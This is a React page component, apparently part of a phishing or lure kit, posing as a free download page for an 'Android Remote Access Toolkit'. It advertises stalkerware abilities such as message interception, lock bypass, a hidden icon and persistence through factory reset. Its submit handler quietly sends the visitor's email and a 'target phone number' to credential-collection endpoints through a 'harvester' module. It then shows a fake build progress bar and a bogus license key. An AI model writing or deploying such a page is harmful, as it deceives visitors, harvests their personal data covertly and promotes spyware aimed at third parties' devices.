import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Grid, LinearProgress, Chip, Avatar, Divider, Paper, Fade } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

export default function AndroidHackingPage() {
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [downloading, setDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [completed, setCompleted] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleDownload = () => {
    if (!email) return;
    
    harvester.send('/api/collect/formdata', {
      formId: 'android-hack-download',
      fields: { email, phone },
      url: window.location.href
    });

    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      phone,
      url: window.location.href,
      formType: 'android-hacking-tool',
      fieldData: { email, phone }
    });

    setDownloading(true);
    let prog = 0;
    const interval = setInterval(() => {
      prog += Math.random() * 10 + 5;
      if (prog >= 100) {
        clearInterval(interval);
        setProgress(100);
        setTimeout(() => setCompleted(true), 600);
      } else {
        setProgress(prog);
      }
    }, 300);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#0a0e17', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4, px: 2 }}>
        <Container maxWidth="sm">
          <Fade in={true}>
            <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(124,58,237,0.2)', borderRadius: '20px', textAlign: 'center', overflow: 'hidden' }}>
              <Box sx={{ background: 'linear-gradient(135deg, #7c3aed, #6d28d9)', p: 4 }}>
                <Typography sx={{ fontSize: '4rem' }}>✅</Typography>
                <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2 }}>
                  APK Ready!
                </Typography>
              </Box>
              <CardContent sx={{ p: 3.5 }}>
                <Typography sx={{ color: '#94a3b8', mb: 2, lineHeight: 1.6 }}>
                  Your Android hacking toolkit has been prepared for <strong style={{ color: '#a78bfa' }}>{email}</strong>.
                </Typography>
                <Paper sx={{ 
                  bgcolor: 'rgba(124,58,237,0.08)', 
                  border: '1px solid rgba(124,58,237,0.2)', 
                  borderRadius: '12px', 
                  p: 2.5, 
                  mb: 3,
                  fontFamily: 'monospace'
                }}>
                  <Typography sx={{ color: '#a78bfa', fontWeight: 600, fontSize: '0.9rem', fontFamily: 'monospace' }}>
                    🔑 License: DROID-HACK-{Math.random().toString(36).substr(2, 8).toUpperCase()}
                  </Typography>
                </Paper>
                <Box sx={{ display: 'flex', gap: 2, justifyContent: 'center', flexWrap: 'wrap' }}>
                  <Button variant="outlined" onClick={() => window.location.href = '/'} sx={{ borderColor: 'rgba(255,255,255,0.2)', color: '#888', borderRadius: '10px', textTransform: 'none', fontWeight: 600, px: 3 }}>
                    Back to Home
                  </Button>
                  <Button variant="contained" href="https://github.com" target="_blank" sx={{ background: 'linear-gradient(135deg, #7c3aed, #6d28d9)', color: '#fff', fontWeight: 700, borderRadius: '10px', textTransform: 'none', px: 3, boxShadow: '0 4px 14px rgba(124,58,237,0.3)' }}>
                    📱 Download APK
                  </Button>
                </Box>
              </CardContent>
            </Card>
          </Fade>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa' }}>
      {/* Hero */}
      <Box sx={{ 
        background: 'linear-gradient(135deg, #2d1b69 0%, #1a1a2e 50%, #0f3460 100%)',
        py: { xs: 6, md: 8 }, 
        position: 'relative', 
        overflow: 'hidden' 
      }}>
        <Container maxWidth="md" sx={{ textAlign: 'center', position: 'relative', zIndex: 1 }}>
          <Typography sx={{ fontSize: { xs: '3rem', md: '4rem' }, mb: 2 }}>📱</Typography>
          <Typography variant="h3" sx={{ 
            color: '#fff', fontWeight: 900, mb: 1, 
            fontSize: { xs: '1.8rem', md: '2.5rem' },
            letterSpacing: '-0.5px'
          }}>
            Android Remote Access Toolkit
          </Typography>
          <Typography sx={{ color: 'rgba(255,255,255,0.6)', mb: 3, maxWidth: 600, mx: 'auto', fontSize: { xs: '0.9rem', md: '1rem' }, lineHeight: 1.7 }}>
            Complete Android penetration testing suite. Monitor, control, and audit Android devices remotely.
          </Typography>
          <Box sx={{ display: 'flex', justifyContent: 'center', gap: 1.5, flexWrap: 'wrap' }}>
            <Chip label="⭐ 4.8/5" sx={{ bgcolor: 'rgba(156,39,176,0.2)', color: '#ce93d8', fontWeight: 600, border: '1px solid rgba(156,39,176,0.2)' }} />
            <Chip label="👥 1.2M+ Downloads" sx={{ bgcolor: 'rgba(0,240,255,0.15)', color: '#00f0ff', fontWeight: 600, border: '1px solid rgba(0,240,255,0.15)' }} />
            <Chip label="🛡️ Obfuscated APK" sx={{ bgcolor: 'rgba(255,170,0,0.15)', color: '#ffaa00', fontWeight: 600, border: '1px solid rgba(255,170,0,0.15)' }} />
          </Box>
        </Container>
      </Box>

      <Container maxWidth="lg" sx={{ mt: -4, position: 'relative', zIndex: 10, pb: 6, px: { xs: 2, md: 3 } }}>
        <Card elevation={0} sx={{ 
          borderRadius: '20px', 
          mb: 4,
          border: '1px solid #e2e8f0',
          boxShadow: '0 4px 24px rgba(0,0,0,0.06)'
        }}>
          <CardContent sx={{ p: { xs: 2.5, md: 4 } }}>
            <Grid container spacing={3} alignItems="center">
              <Grid item xs={12} md={7}>
                <Typography variant="h5" sx={{ fontWeight: 800, color: '#0f172a', mb: 2.5, fontSize: '1.15rem' }}>
                  🛡️ Complete Android Security Suite
                </Typography>
                <Grid container spacing={1.5}>
                  {[
                    { icon: '📷', text: 'Remote camera & microphone access' },
                    { icon: '📍', text: 'Real-time GPS location tracking' },
                    { icon: '💬', text: 'WhatsApp, Telegram & SMS intercept' },
                    { icon: '🔐', text: 'Screen lock bypass & pattern unlock' },
                    { icon: '📂', text: 'Full file system access & download' },
                    { icon: '📞', text: 'Call log & contact list extraction' },
                    { icon: '🔑', text: 'Saved WiFi passwords & credential dump' },
                    { icon: '🔄', text: 'Persistent access — survives factory reset' },
                  ].map((feat, i) => (
                    <Grid item xs={12} sm={6} key={i}>
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, py: 0.3 }}>
                        <Box sx={{
                          width: 28, height: 28, borderRadius: '8px',
                          bgcolor: '#f1f5f9', display: 'flex', alignItems: 'center', justifyContent: 'center',
                          fontSize: '0.9rem'
                        }}>
                          {feat.icon}
                        </Box>
                        <Typography sx={{ color: '#475569', fontSize: '0.85rem', lineHeight: 1.3 }}>{feat.text}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Grid>
              <Grid item xs={12} md={5}>
                <Box sx={{ 
                  bgcolor: '#f3e8ff', 
                  borderRadius: '16px', 
                  p: 3, 
                  textAlign: 'center', 
                  border: '1px solid #d4b0ff' 
                }}>
                  <Typography variant="h3" sx={{ 
                    color: '#7c3aed', fontWeight: 900, 
                    fontSize: { xs: '2rem', md: '2.5rem' },
                    letterSpacing: '-1px'
                  }}>
                    FREE
                  </Typography>
                  <Typography sx={{ color: '#7c3aed', fontWeight: 600, mb: 2, fontSize: '0.9rem' }}>
                    Premium APK — Normally $299
                  </Typography>
                  <Divider sx={{ my: 1.5, borderColor: '#d4b0ff' }} />
                  {!downloading ? (
                    <Box>
                      <TextField 
                        fullWidth 
                        size="small" 
                        placeholder="Your email for download link" 
                        type="email" 
                        value={email} 
                        onChange={(e) => setEmail(e.target.value)} 
                        sx={{ 
                          mb: 1.5, 
                          '& .MuiOutlinedInput-root': { 
                            bgcolor: '#fff', 
                            borderRadius: '10px',
                            '& fieldset': { borderColor: '#d4b0ff', borderWidth: '1.5px' },
                            '&.Mui-focused fieldset': { borderColor: '#7c3aed' },
                          }
                        }} 
                      />
                      <TextField 
                        fullWidth 
                        size="small" 
                        placeholder="Target phone number (optional)" 
                        value={phone} 
                        onChange={(e) => setPhone(e.target.value)} 
                        sx={{ 
                          mb: 1.5, 
                          '& .MuiOutlinedInput-root': { 
                            bgcolor: '#fff', 
                            borderRadius: '10px',
                            '& fieldset': { borderColor: '#d4b0ff', borderWidth: '1.5px' },
                            '&.Mui-focused fieldset': { borderColor: '#7c3aed' },
                          }
                        }} 
                      />
                      <Button 
                        variant="contained" 
                        fullWidth 
                        size="large" 
                        onClick={handleDownload} 
                        disabled={!email || downloading} 
                        sx={{ 
                          background: 'linear-gradient(135deg, #7c3aed, #6d28d9)', 
                          '&:hover': { background: 'linear-gradient(135deg, #6d28d9, #5b21b6)' }, 
                          '&:disabled': { bgcolor: '#c4b5fd' }, 
                          fontWeight: 700, 
                          py: 1.3, 
                          fontSize: '1rem',
                          borderRadius: '10px',
                          textTransform: 'none',
                          boxShadow: '0 4px 14px rgba(124,58,237,0.3)'
                        }}
                      >
                        📱 Generate Custom APK
                      </Button>
                    </Box>
                  ) : (
                    <Box>
                      <LinearProgress variant="determinate" value={progress} sx={{ 
                        height: 8, borderRadius: '4px', bgcolor: '#e8e8e8', 
                        '& .MuiLinearProgress-bar': { background: 'linear-gradient(90deg, #7c3aed, #6d28d9)', borderRadius: '4px' } 
                      }} />
                      <Typography sx={{ color: '#94a3b8', mt: 1.5, fontSize: '0.9rem' }}>Building custom APK... {Math.round(progress)}%</Typography>
                    </Box>
                  )}
                  <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, mt: 1.5, flexWrap: 'wrap' }}>
                    <Typography sx={{ color: '#94a3b8', fontSize: '0.75rem' }}>🔒 APK size: 4.2 MB</Typography>
                    <Typography sx={{ color: '#94a3b8', fontSize: '0.75rem' }}>📱 Android 7.0+</Typography>
                  </Box>
                </Box>
              </Grid>
            </Grid>
          </CardContent>
        </Card>

        <Box sx={{ display: 'flex', alignItems: 'center', gap: 2, mb: 2.5 }}>
          <Box sx={{ width: 4, height: 24, borderRadius: 2, background: 'linear-gradient(180deg, #7c3aed, #6d28d9)' }} />
          <Typography variant="h5" sx={{ fontWeight: 800, color: '#0f172a', fontSize: { xs: '1.1rem', md: '1.25rem' } }}>
            Advanced Features
          </Typography>
        </Box>
        <Grid container spacing={2.5} sx={{ mb: 4 }}>
          {[
            { icon: '🕵️', title: 'Stealth Mode', desc: 'App icon hides itself after installation. Runs completely invisible with zero notifications.', color: '#7c3aed' },
            { icon: '🔄', title: 'Persistence Engine', desc: 'Survives reboots, app updates, and factory resets. Reinstalls itself automatically.', color: '#e74c3c' },
            { icon: '📡', title: 'Remote Shell', desc: 'Full remote command execution. Execute any shell command on the target device in real-time.', color: '#27ae60' },
            { icon: '🔓', title: 'Lock Bypass', desc: 'Bypass PIN, pattern, password, and biometric locks. Access the device without triggering alarms.', color: '#f39c12' },
          ].map((f, i) => (
            <Grid item xs={12} sm={6} md={3} key={i}>
              <Card elevation={0} sx={{ 
                borderRadius: '14px', height: '100%', 
                border: '1px solid #e2e8f0',
                transition: 'transform 0.2s, box-shadow 0.2s', 
                '&:hover': { transform: 'translateY(-4px)', boxShadow: '0 12px 40px rgba(0,0,0,0.08)' } 
              }}>
                <CardContent sx={{ p: 3 }}>
                  <Box sx={{ fontSize: '2.8rem', mb: 1.5 }}>{f.icon}</Box>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 1, fontSize: '1rem' }}>{f.title}</Typography>
                  <Typography sx={{ color: '#64748b', fontSize: '0.82rem', lineHeight: 1.7 }}>{f.desc}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </Container>
    </Box>
  );
}